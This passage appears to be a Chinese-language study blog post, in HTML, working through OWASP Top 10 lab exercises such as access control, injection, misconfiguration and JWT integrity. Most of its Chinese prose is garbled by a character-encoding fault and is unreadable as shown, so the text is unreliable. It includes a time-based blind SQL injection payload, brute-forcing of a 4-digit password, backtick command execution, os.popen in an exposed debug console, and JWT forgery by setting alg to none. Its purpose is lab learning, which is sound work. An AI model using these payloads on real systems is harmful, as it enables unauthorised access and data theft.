ä¸ºè¿™æ ·å®ƒä¼šå»¶è¿Ÿ5ç§’åè¿”å›ç•Œé¢</span><br><span class="hljs-string"></span><br><span class="hljs-string">2.å‰©ä¸‹çš„æ­¥éª¤è·Ÿå¸ƒå°”ç›²æ³¨æ²¡ä»€ä¹ˆåŒºåˆ« å°±æ˜¯æœ‰äº†sleepæ¥åˆ¤æ–­æŸ¥è¯¢çš„æ•°æ®æ˜¯å¦å­˜åœ¨</span><br><span class="hljs-string"></span><br><span class="hljs-string">3.admin123&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<span class="hljs-comment">--</span><br><br>ç„¶åè¿™ä¸€å…³ç”¨æˆ·åæ˜¯<span class="hljs-keyword">admin</span> å¯†ç çš„è¯ä»ç„¶æ˜¯<span class="hljs-number">4</span>ä½æ•°å­— éœ€è¦è‡ªå·±å»çˆ†ç ´<br></code></pre></td></tr></table></figure><p>åˆ°å…·ä½“æƒ…å†µè¿˜å¾—å†™è„šæœ¬è¿›è¡Œçˆ†ç ´ï¼Œæˆ–è€…æ˜¯åˆ©ç”¨burpè¿›è¡Œçˆ†ç ´  </p><p>ä¿®å¤:</p><p>1.ç™½åå•ï¼Œå¯¹äºä¸€äº›ä¸å…è®¸è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œä¸€ä¸ªæ›¿æ¢</p><p>2.å¯¹ç”¨æˆ·è¾“å…¥çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰å¤„ç†</p><h2 id="Web-Hacking-Fundamentals"><a href="#Web-Hacking-Fundamentals" class="headerlink" title="Web Hacking Fundamentals"></a>Web Hacking Fundamentals</h2><h3 id="OWASP-Top-10-2021"><a href="#OWASP-Top-10-2021" class="headerlink" title="OWASP Top 10 - 2021"></a>OWASP Top 10 - 2021</h3><p>Broken Access Control</p><p>å…¶å®å°±æ˜¯ä¸€ä¸ªæœªæˆæƒè®¿é—®</p><p>Broken Access Control (IDOR Challenge)</p><p>IDORæ¼æ´ å¯ä»¥è®¿é—®å…¶ä»–ç”¨æˆ·çš„ç›¸å…³ä¿¡æ¯ å¯èƒ½ä¼šé€ æˆæ•æ„Ÿä¿¡æ¯çš„æ³„éœ² æ¼æ´åŸå› :åº”ç”¨ç¨‹åºæ²¡æœ‰å¯¹ç”¨æˆ·æ˜¯å¦å…·æœ‰ç›¸å…³æƒé™è®¿é—®åšå‡ºé™åˆ¶ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403122035395.png" alt="image-20240312203542028"></p><p>Cryptographic Failures</p><p>ç®€å•çš„æ¥è®²å°±æ˜¯ç”¨æˆ·å’ŒæœåŠ¡ä¹‹é—´é€šä¿¡çš„åŠ å¯†ä¸æ˜¯é‚£ä¹ˆçš„ä¸¥æ ¼ï¼Œå®¹æ˜“è¢«ç ´è§£ï¼Œä»è€Œå¯¼è‡´ä¿¡æ¯çš„æ³„éœ²ã€‚</p><p>åœ¨æ›´å¤æ‚çš„çº§åˆ«ä¸Šï¼Œåˆ©ç”¨æŸäº›åŠ å¯†æ•…éšœé€šå¸¸æ¶‰åŠè¯¸å¦‚â€œä¸­é—´äººæ”»å‡»â€ä¹‹ç±»çš„æŠ€æœ¯ï¼Œæ”»å‡»è€…ä¼šé€šè¿‡ä»–ä»¬æ§åˆ¶çš„è®¾å¤‡å¼ºåˆ¶ç”¨æˆ·è¿æ¥ã€‚ç„¶åï¼Œä»–ä»¬å°†åˆ©ç”¨å¯¹ä»»ä½•ä¼ è¾“æ•°æ®çš„å¼±åŠ å¯†æ¥è®¿é—®æˆªè·çš„ä¿¡æ¯ï¼ˆå¦‚æœæ•°æ®é¦–å…ˆè¢«åŠ å¯†ï¼‰ã€‚å½“ç„¶ï¼Œè®¸å¤šç¤ºä¾‹è¦ç®€å•å¾—å¤šï¼Œå¹¶ä¸”å¯ä»¥åœ¨ Web åº”ç”¨ç¨‹åºä¸­æ‰¾åˆ°æ¼æ´ï¼Œè€Œæ— éœ€é«˜çº§ç½‘ç»œçŸ¥è¯†å³å¯åˆ©ç”¨è¿™äº›æ¼æ´ã€‚äº‹å®ä¸Šï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ•æ„Ÿæ•°æ®å¯ä»¥ç›´æ¥åœ¨ Web æœåŠ¡å™¨æœ¬èº«ä¸Šæ‰¾åˆ°ã€‚</p><p>Cryptographic Failures (Supporting Material 1)</p><p>æœ‰äº›æ•°æ®åº“ä¹Ÿå¯ä»¥å­˜å‚¨ä¸ºæ–‡ä»¶ è¢«ç§°ä¸ºå¹³é¢æ–‡ä»¶æ•°æ®åº“ ç„¶åæˆ‘ä»¬å¯ä»¥ä¸‹è½½ä¸‹æ¥</p><p>å…·ä½“æ“ä½œ:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span>sqlite3 &lt;<span class="hljs-keyword">database</span>-<span class="hljs-type">name</span>&gt;<br><span class="hljs-number">2.</span> .<span class="hljs-keyword">tables</span>  //æŸ¥çœ‹è¡¨å<br><span class="hljs-number">3.</span> PRAGMA table_info(<span class="hljs-built_in">table_name</span>); //å¯ä»¥å‡ºç°åˆ—å<br><span class="hljs-number">4.</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-built_in">table_name</span>;    //æŸ¥çœ‹è¡¨é‡Œé¢çš„å†…å®¹<br></code></pre></td></tr></table></figure><p>æœ‰çš„æ—¶å€™æˆ‘ä»¬å¾—åˆ°çš„å¯†ç æ˜¯ä¸€äº›ç»è¿‡nd5åŠ å¯†åçš„ ç„¶åæˆ‘ä»¬éœ€è¦å»ä¸€äº›å¹³å°å»è§£å¯†</p><p><a href="https://crackstation.net/">CrackStation - åœ¨çº¿å¯†ç å“ˆå¸Œç ´è§£ - MD5ã€SHA1ã€Linuxã€Rainbow Tables ç­‰</a></p><p>æŒ‘æˆ˜:</p><p>åœ¨loginç½‘é¡µæºä»£ç ä¸­å‘ç°ä¿¡æ¯ /assets</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403131358159.png" alt="image-20240313135757037"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403131359093.png" alt="image-20240313135925920"></p><p>ç„¶åä¸‹è½½ä¸‹æ¥</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403131403882.png" alt="image-20240313140356643"></p><p>æ‹¿åˆ°äº†å¯†ç ç™»å½•å³å¯</p><p>Injection</p><p>ç®€è¦æ¦‚æ‹¬äº†ä¸€ä¸‹sqlæ³¨å…¥å’Œå‘½ä»¤æ³¨å…¥ã€‚</p><ul><li><strong>SQLæ³¨å…¥ï¼š</strong>å½“ç”¨æˆ·æ§åˆ¶çš„è¾“å…¥ä¼ é€’ç»™ SQL æŸ¥è¯¢æ—¶ï¼Œä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥ä¼ å…¥ SQL æŸ¥è¯¢æ¥æ“çºµæ­¤ç±»æŸ¥è¯¢çš„ç»“æœã€‚å½“æ­¤è¾“å…¥ä¼ é€’åˆ°æ•°æ®åº“æŸ¥è¯¢æ—¶ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šè®¿é—®ã€ä¿®æ”¹å’Œåˆ é™¤æ•°æ®åº“ä¸­çš„ä¿¡æ¯ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥çªƒå–æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚ä¸ªäººè¯¦ç»†ä¿¡æ¯å’Œå‡­æ®ã€‚</li><li><strong>å‘½ä»¤æ³¨å…¥ï¼š</strong>å½“ç”¨æˆ·è¾“å…¥ä¼ é€’ç»™ç³»ç»Ÿå‘½ä»¤æ—¶ï¼Œä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨åº”ç”¨ç¨‹åºæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œä»è€Œå¯èƒ½å…è®¸ä»–ä»¬è®¿é—®ç”¨æˆ·çš„ç³»ç»Ÿã€‚</li></ul><p>é˜²æ­¢æ³¨å…¥æ”»å‡»çš„ä¸»è¦é˜²å¾¡æªæ–½æ˜¯ç¡®ä¿ç”¨æˆ·æ§åˆ¶çš„è¾“å…¥ä¸ä¼šè¢«è§£é‡Šä¸ºæŸ¥è¯¢æˆ–å‘½ä»¤ã€‚æœ‰ä¸åŒçš„æ–¹æ³•å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ï¼š</p><ul><li><strong>ä½¿ç”¨å…è®¸åˆ—è¡¨ï¼š</strong>å½“è¾“å…¥å‘é€åˆ°æœåŠ¡å™¨æ—¶ï¼Œæ­¤è¾“å…¥å°†ä¸å®‰å…¨è¾“å…¥æˆ–å­—ç¬¦åˆ—è¡¨è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœè¾“å…¥è¢«æ ‡è®°ä¸ºå®‰å…¨ï¼Œåˆ™å¯¹å…¶è¿›è¡Œå¤„ç†ã€‚å¦åˆ™ï¼Œå®ƒå°†è¢«æ‹’ç»ï¼Œå¹¶ä¸”åº”ç”¨ç¨‹åºå°†å¼•å‘é”™è¯¯ã€‚</li><li><strong>å‰¥ç¦»è¾“å…¥ï¼š</strong> å¦‚æœè¾“å…¥åŒ…å«å±é™©å­—ç¬¦ï¼Œåˆ™åœ¨å¤„ç†ä¹‹å‰åˆ é™¤è¿™äº›å­—ç¬¦ã€‚</li></ul><p>å®ä¾‹:</p><p>åå¼•å·å‘½ä»¤æ‰§è¡Œ </p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-string">`cmd`</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403131913142.png" alt="image-20240313191313732"></p><p>hgame2024æŸä¸ªé¢˜å°±æ˜¯è¿™æ ·çš„</p><p>å°±æœ‰ä¸€ä¸ªç‚¹:</p><p>åœ¨linuxä¸­sbinç›®å½•é€šå¸¸å­˜æ”¾ç€ç³»ç»Ÿç®¡ç†å‘˜ å¯ä»¥åœ¨/etc/passwdä¸­æŸ¥çœ‹</p><p>Insecure Design</p><p>è¿™ä¸ªæ˜¯åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå¼€å‘äººå‘˜ä¸ºäº†æµ‹è¯•ä¾¿æ·ï¼Œå¯èƒ½ä¼šæœ‰ä¸€äº›ä¸å®‰å…¨çš„åœ°æ–¹ï¼Œç„¶ååœ¨å®é™…ç”Ÿäº§çš„ç¯å¢ƒä¸­ï¼Œå¿˜è®°ä¿®æ”¹äº†å¯¼è‡´ä¸€äº›æ¼æ´çš„äº§ç”Ÿã€‚</p><p>å®ä¾‹:</p><p>é¦–å…ˆæ ¹æ®è¯´æ˜ï¼Œå…ˆåœ¨å¿˜è®°å¯†ç é‚£é‡Œè¾“å…¥josephç”¨æˆ·</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403132242159.png" alt="image-20240313224235733"></p><p>ç„¶åæœ‰ä¸‰ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬é€‰æ‹©ç¬¬äºŒä¸ªï¼Œè¿™ä¸ªå®¹æ˜“è¿›è¡ŒçŒœæµ‹ï¼Œè¯•è¯•çº¢ï¼Œè“ï¼Œç™½ï¼Œç»¿ç­‰å¸¸è§çš„é¢œè‰²ï¼Œæœ€åå‘ç°æ˜¯ç»¿ã€‚</p><p>æœ€åå¯ä»¥å¾—åˆ°josephç”¨æˆ·çš„å¯†ç </p><ol start="5"><li>Security Misconfiguration</li></ol><p>å®‰å…¨é…ç½®é”™è¯¯ä¸å…¶ä»–å‰ 10 å¤§æ¼æ´ä¸åŒï¼Œå› ä¸ºå®ƒä»¬å‘ç”Ÿåœ¨å¯ä»¥é€‚å½“é…ç½®å®‰å…¨æ€§ä½†æœªæ­£ç¡®é…ç½®çš„æƒ…å†µä¸‹ã€‚å³ä½¿æ‚¨ä¸‹è½½äº†æœ€æ–°çš„è½¯ä»¶ï¼Œç³Ÿç³•çš„é…ç½®ä¹Ÿå¯èƒ½ä½¿æ‚¨çš„å®‰è£…å®¹æ˜“å—åˆ°æ”»å‡»ã€‚</p><p>å®‰å…¨é”™è¯¯é…ç½®åŒ…æ‹¬ï¼š</p><ul><li>å¯¹äº‘æœåŠ¡ï¼ˆå¦‚ S3 å­˜å‚¨æ¡¶ï¼‰çš„æƒé™é…ç½®ä¸å½“ã€‚</li><li>å¯ç”¨ä¸å¿…è¦çš„åŠŸèƒ½ï¼Œä¾‹å¦‚æœåŠ¡ã€é¡µé¢ã€å¸æˆ·æˆ–æƒé™ã€‚</li><li>å¯†ç æœªæ›´æ”¹çš„é»˜è®¤å¸æˆ·ã€‚</li><li>é”™è¯¯æ¶ˆæ¯è¿‡äºè¯¦ç»†ï¼Œå…è®¸æ”»å‡»è€…äº†è§£æœ‰å…³ç³»ç»Ÿçš„æ›´å¤šä¿¡æ¯ã€‚</li><li>ä¸ä½¿ç”¨ <a href="https://owasp.org/www-project-secure-headers/">HTTP å®‰å…¨æ ‡å¤´</a>ã€‚</li></ul><p>æ­¤æ¼æ´é€šå¸¸ä¼šå¯¼è‡´æ›´å¤šæ¼æ´ï¼Œä¾‹å¦‚å…è®¸æ‚¨è®¿é—®æ•æ„Ÿæ•°æ®çš„é»˜è®¤å‡­æ®ã€XML å¤–éƒ¨å®ä½“ ï¼ˆXXEï¼‰ æˆ–ç®¡ç†é¡µé¢ä¸Šçš„å‘½ä»¤æ³¨å…¥ã€‚</p><p>è¿˜å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›sstiæ¼æ´</p><p>å®ä¾‹:å…ˆè®¿é—®/console è¿›å…¥æ§åˆ¶å°ï¼Œå¯ä»¥æ‰§è¡Œpythonå‘½ä»¤ åœ¨sstiä¸­æœ‰çš„æ˜¯éœ€è¦è®¡ç®—pinç ï¼Œç„¶åå†è¿›å…¥æ§åˆ¶å°æ‰§è¡Œå‘½ä»¤</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">import <span class="hljs-built_in">os</span>;<span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>).<span class="hljs-built_in">read</span>();<br></code></pre></td></tr></table></figure><ol start="6"><li>Vulnerable and Outdated Components</li></ol><p>æœ‰æ—¶ï¼Œæ‚¨å¯èƒ½ä¼šå‘ç°æ‚¨æ­£åœ¨æ¸—é€æµ‹è¯•çš„å…¬å¸/å®ä½“æ­£åœ¨ä½¿ç”¨å…·æœ‰å·²çŸ¥æ¼æ´çš„ç¨‹åºã€‚</p><p>ä¾‹å¦‚ï¼Œå‡è®¾ä¸€å®¶å…¬å¸å·²ç»æœ‰å‡ å¹´æ²¡æœ‰æ›´æ–°ä»–ä»¬çš„ WordPress ç‰ˆæœ¬äº†ï¼Œä½¿ç”¨ <a href="https://wpscan.com/wordpress-security-scanner">WPScan</a> ç­‰å·¥å…·ï¼Œæ‚¨ä¼šå‘ç°å®ƒæ˜¯ 4.6 ç‰ˆã€‚ä¸€äº›å¿«é€Ÿç ”ç©¶å°†æ­ç¤º WordPress 4.6 å®¹æ˜“å—åˆ°æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ ï¼ˆRCEï¼‰ æ”»å‡»ï¼Œæ›´å¥½çš„æ˜¯ï¼Œæ‚¨å¯ä»¥åœ¨ <a href="https://www.exploit-db.com/exploits/41962">Exploit-DB</a> ä¸Šæ‰¾åˆ°å·²ç»è¿›è¡Œçš„æ¼æ´åˆ©ç”¨ã€‚</p><p>Vulnerable and Outdated Components - Exploit</p><p>æˆ‘ä»¬åœ¨çŸ¥é“è¯¥ç‰ˆæœ¬å­˜åœ¨æ¼æ´çš„æƒ…å†µä¸‹ï¼Œä¸‹ä¸€æ­¥è¦åšçš„å°±æ˜¯å»åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚ å¯ä»¥åœ¨exploitä¸­å¯»æ‰¾ç›¸å…³çš„æ¼æ´ä¿¡æ¯ã€‚</p><p>å®ä¾‹:</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403132343773.png" alt="image-20240313234355495"></p><p>å»exploitä¸­æœç´¢online book store </p><p>ç„¶åå¯ä»¥æ‰¾åˆ°<img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403132344494.png" alt="image-20240313234444214"></p><p>ä¸‹è½½ä¸‹æ¥</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403132348902.png" alt="image-20240313234811766"></p><ol start="7"><li>Identification and Authentication Failures</li></ol><p>ä¸»è¦ä»‹ç»äº†èº«ä»½éªŒè¯çš„ä¸€äº›ç»•è¿‡ã€‚</p><p>1.å¼±å£ä»¤</p><p>2.çˆ†ç ´</p><p>3.é€šè¿‡æ„é€ cookieè¿›è¡Œç™»å½•</p><p>ç„¶åç›¸å…³ä¿®å¤è¿‡ç¨‹:</p><p>1.ä½¿ç”¨å¼ºå¯†ç  </p><p>2.å¯¹ç™»å½•æ¬¡æ•°è¿›è¡Œé™åˆ¶</p><p>3.å®æ–½å¤šé‡èº«ä»½éªŒè¯</p><p>å®ä¾‹:</p><p>é¦–å…ˆæˆ‘ä»¬è¿›å»ä¹‹åæ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œç„¶åå½“æˆ‘ä»¬ä½¿ç”¨å·²ç»å­˜åœ¨çš„ç”¨æˆ·å»ç™»å½•æ—¶ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¹¶ä¸çŸ¥é“å¯†ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»å°è¯•é‡æ–°æ³¨å†Œè¯¥ç”¨æˆ·</p><p>å¦‚æœæ³¨å†ŒæˆåŠŸï¼Œæ‰€æ‹¥æœ‰çš„æƒé™æ˜¯ç›¸åŒçš„ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403141933290.png" alt="image-20240314193314859"></p><p>æ³¨æ„åœ¨ç™»å½•çš„æ—¶å€™å‰é¢ä¹Ÿè¦æ·»åŠ ç©ºæ ¼ã€‚</p><p>8.Software and Data Integrity Failures</p><p>ä¸»è¦ä»‹ç»äº†ä¸€äº›æ•°æ®å’Œå’Œè½¯ä»¶çš„å®Œæ•´æ€§ï¼Œé€šå¸¸æˆ‘ä»¬åœ¨ç½‘ä¸Šä¸‹è½½ä¸€ä¸ªè½¯ä»¶æ—¶ï¼Œå…¶å¼€å‘è€…ä¼šè®¾è®¡ä¸€æ®µç»è¿‡hashåŠ å¯†è¿‡åçš„å€¼ è¿™æ˜¯åˆ¤æ–­æˆ‘ä»¬ä¸‹è½½çš„æ•°æ®æ˜¯å¦è¢«ä¿®æ”¹çš„ä¸€ä¸ªé‡è¦è¯„åˆ¤ã€‚</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gams">åœ¨linuxä¸­æŸ¥çœ‹ä¸‹è½½æ–‡ä»¶çš„md5å€¼æ–¹æ³•:<br><span class="hljs-function"><span class="hljs-title">md5sum</span></span> ......<br><br>sha1:<br><span class="hljs-function"><span class="hljs-title">sha1sum</span></span> ......<br><br>sha256:<br><span class="hljs-function"><span class="hljs-title">sha256sum</span></span>......<br></code></pre></td></tr></table></figure><p>Software Integrity Failures (è½¯ä»¶å®Œæ•´æ€§)</p><p>å¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªç½‘ç«™ï¼Œè¯¥ç½‘ç«™ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“ï¼Œè¿™äº›åº“å­˜å‚¨åœ¨ä¸€äº›æ‚¨æ— æ³•æ§åˆ¶çš„å¤–éƒ¨æœåŠ¡å™¨ä¸­ã€‚æ¯”å¦‚è¯´: jQuery </p><p>å½“ç”¨æˆ·å»è®¿é—®è¯¥ç½‘ç«™æ—¶ï¼Œæµè§ˆå™¨å°†è¯»å–å…¶HTMLä»£ç å¹¶ä»æŒ‡å®šçš„å¤–éƒ¨æºä¸‹è½½jQueryã€‚ç°åœ¨å¦‚æœæ”»å‡»è€…æ”»å‡»äº†jQeryå®˜æ–¹ç½‘ç«™ï¼Œå¹¶åœ¨é‡Œé¢æ’å…¥äº†æ¶æ„çš„ä»£ç ï¼Œæ¯ä¸€ä¸ªè®¿é—®è¯¥ç½‘ç«™çš„äººéƒ½ä¼šä¸­æ‹›ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹è¿™ä¸ªjsåœ°å€è¿›è¡ŒhashåŠ å¯†ï¼Œè¿™æ ·åªæœ‰ä¸¤è€…çš„hashç›¸åŒæ—¶ï¼Œæ‰èƒ½æ‰§è¡Œã€‚</p><p>ç›¸å…³ç½‘ç«™:<a href="https://www.srihash.org/">SRI å“ˆå¸Œç”Ÿæˆå™¨ (srihash.org)</a></p><p>Data Integrity Failures(æ•°æ®å®Œæ•´æ€§)</p><p>å½“æˆ‘ä»¬ç™»å½•ä¸€ä¸ªç½‘ç«™æ—¶ï¼Œæˆ‘ä»¬çš„è´¦å·ä¿¡æ¯ä¼šå­˜å‚¨åœ¨cookieä¸­ï¼Œæœ‰çš„æ—¶å€™è¿™äº›cookieä¼šè¢«ä¿®æ”¹ï¼Œå¯¼è‡´å¯ä»¥ç™»å½•å…¶ä»–çš„ç”¨æˆ·ï¼Œæ‰€ä»¥éœ€è¦ä¸€äº›å®‰å…¨æœºåˆ¶æ¥ä¿æŠ¤å®ƒä»¬ä¸ä¼šè¢«ç¯¡æ”¹ã€‚</p><p>å…¶ä¸­ä¸€ç§å®ç°æ–¹æ³•å°±æ˜¯<strong>JSON Web ä»¤ç‰Œ ï¼ˆJWTï¼‰</strong></p><p>å…ˆæ¥çœ‹çœ‹jwtçš„ç»„æˆéƒ¨åˆ†ã€‚</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/11c86acaea05f98045cec5634e03e997.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/11c86acaea05f98045cec5634e03e997.png"></p><p>åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æ˜¯headerå¤´ï¼ŒæŒ‡ç¤ºJWTçš„å…ƒæ•°æ®ï¼ŒæŒ‡æ˜äº†ä½¿ç”¨ä»€ä¹ˆç­¾åç®—æ³•ã€‚ç¬¬äºŒéƒ¨åˆ†åŒ…å«é”®å€¼å¯¹ï¼Œå…¶ä¸­åŒ…å«Webåº”ç”¨ç¨‹åºå¸Œæœ›å®¢æˆ·ç«¯å­˜å‚¨çš„æ•°æ®ã€‚ç¬¬ä¸‰éƒ¨åˆ†æ˜¯åˆ©ç”¨å¯†é’¥è¿›è¡ŒåŠ å¯†åçš„å€¼ï¼Œè¿™æ˜¯ä¿æŠ¤çš„åŸºç¡€ï¼Œåªæœ‰æˆ‘ä»¬çŸ¥é“å¯†é’¥æ‰èƒ½ä¿®æ”¹payloadã€‚</p><p>è¿™ä¸‰éƒ¨åˆ†éƒ½æ˜¯base64åŠ å¯†çš„ï¼Œä½†æ˜¯ç¬¬ä¸‰éƒ¨åˆ†æœ‰äºŒè¿›åˆ¶çš„æ•°æ®ï¼Œæ‰€ä»¥è§£å¯†è¿‡åä¹ŸæŸ¥çœ‹ä¸äº†æœ‰ç”¨çš„ä¿¡æ¯ã€‚</p><p>æœ‰é˜²ä¹Ÿæœ‰æ”»ï¼Œä¸‹é¢æ˜¯å¦‚ä½•è¿›è¡Œç ´è§£ã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">1</span>.ä¿®æ”¹<span class="hljs-selector-tag">Header</span>å¤´é‡Œé¢çš„algä¸º<span class="hljs-attribute">none</span> <br><span class="hljs-number">2</span>.åˆ é™¤ç­¾åéƒ¨åˆ†ï¼Œä½†æ˜¯ä¿ç•™ç‚¹<br></code></pre></td></tr></table></figure><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f5d1b4ef49ff4eef52e7617631225e8a.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f5d1b4ef49ff4eef52e7617631225e8a.png"></p><p>å®ä¾‹:</p><p>é¦–å…ˆåˆ©ç”¨guestçš„èº«ä»½è¿›è¡Œç™»å½•ï¼Œè´¦å·å¯†ç éƒ½æ˜¯guestï¼Œä½†æ˜¯å¾—ä½¿ç”¨adminèº«ä»½æ‰èƒ½æŸ¥çœ‹flag</p><p>cookieå€¼å¦‚ä¸‹:</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142051260.png" alt="image-20240314205128142">  </p><p>ç„¶åæŒ‰ç…§ä¸Šé¢çš„æ“ä½œè¿›è¡Œå³å¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142056314.png" alt="image-20240314205642031"></p><ol start="9"><li>Security Logging and Monitoring Failures</li></ol><p>è¿™ä¸»è¦ä»‹ç»äº†æ—¥å¿—æ–‡ä»¶çš„é‡è¦æ€§ï¼Œä»¥åŠæ—¥å¿—æ–‡ä»¶éœ€è¦ä¿å­˜çš„å†…å®¹</p><p>è®¾ç½® Web åº”ç”¨ç¨‹åºæ—¶ï¼Œåº”è®°å½•ç”¨æˆ·æ‰§è¡Œçš„æ¯ä¸ªæ“ä½œã€‚æ—¥å¿—è®°å½•å¾ˆé‡è¦ï¼Œå› ä¸ºåœ¨å‘ç”Ÿäº‹ä»¶æ—¶ï¼Œå¯ä»¥è·Ÿè¸ªæ”»å‡»è€…çš„æ´»åŠ¨ã€‚ä¸€æ—¦ä»–ä»¬çš„è¡Œä¸ºè¢«è¿½è¸ªï¼Œå°±å¯ä»¥ç¡®å®šä»–ä»¬çš„é£é™©å’Œå½±å“ã€‚å¦‚æœæ²¡æœ‰æ—¥å¿—è®°å½•ï¼Œå°±æ— æ³•åˆ¤æ–­æ”»å‡»è€…åœ¨è®¿é—®ç‰¹å®š Web åº”ç”¨ç¨‹åºæ—¶æ‰§è¡Œäº†å“ªäº›æ“ä½œã€‚è¿™äº›æ›´æ˜¾ç€çš„å½±å“åŒ…æ‹¬ï¼š</p><ul><li><strong>ç›‘ç®¡æŸå®³ï¼š</strong>å¦‚æœæ”»å‡»è€…è·å¾—äº†å¯¹ä¸ªäººèº«ä»½ç”¨æˆ·ä¿¡æ¯çš„è®¿é—®æƒé™ï¼Œå¹¶ä¸”æ²¡æœ‰è¿™æ–¹é¢çš„è®°å½•ï¼Œåˆ™æœ€ç»ˆç”¨æˆ·ä¼šå—åˆ°å½±å“ï¼Œå¹¶ä¸”åº”ç”¨ç¨‹åºæ‰€æœ‰è€…å¯èƒ½ä¼šå—åˆ°ç½šæ¬¾æˆ–æ›´ä¸¥å‰çš„å¤„ç½šï¼Œå…·ä½“å–å†³äºæ³•è§„ã€‚</li><li><strong>è¿›ä¸€æ­¥æ”»å‡»çš„é£é™©ï¼š</strong>å¦‚æœä¸è¿›è¡Œæ—¥å¿—è®°å½•ï¼Œæ”»å‡»è€…çš„å­˜åœ¨å¯èƒ½æ— æ³•æ£€æµ‹åˆ°ã€‚è¿™å¯èƒ½å…è®¸æ”»å‡»è€…é€šè¿‡çªƒå–å‡­æ®ã€æ”»å‡»åŸºç¡€è®¾æ–½ç­‰æ–¹å¼å¯¹ Web åº”ç”¨ç¨‹åºæ‰€æœ‰è€…å‘èµ·è¿›ä¸€æ­¥æ”»å‡»ã€‚</li></ul><p>æ—¥å¿—ä¸­å­˜å‚¨çš„ä¿¡æ¯åº”åŒ…æ‹¬ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>HTTP çŠ¶æ€ä»£ç </li><li>æ—¶é—´æˆ³</li><li>ç”¨æˆ·å</li><li>API ç«¯ç‚¹/é¡µé¢ä½ç½®</li><li>IP åœ°å€</li></ul><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142106579.png" alt="image-20240314210621460"></p><p>è¿™äº›æ—¥å¿—åŒ…å«ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œå› 